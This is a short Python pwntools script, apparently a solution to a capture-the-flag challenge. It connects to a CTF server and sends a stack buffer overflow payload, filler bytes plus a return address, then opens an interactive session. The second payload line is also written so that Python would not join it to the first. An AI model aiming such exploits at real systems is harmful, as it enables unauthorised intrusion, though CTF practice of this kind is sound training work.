#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10120)

payload = '0123456789012345678901234567890100000000'
+ '\x66\x05\x40\x00\x00\x00\x00\x00'

r.sendline(payload)
r.interactive()
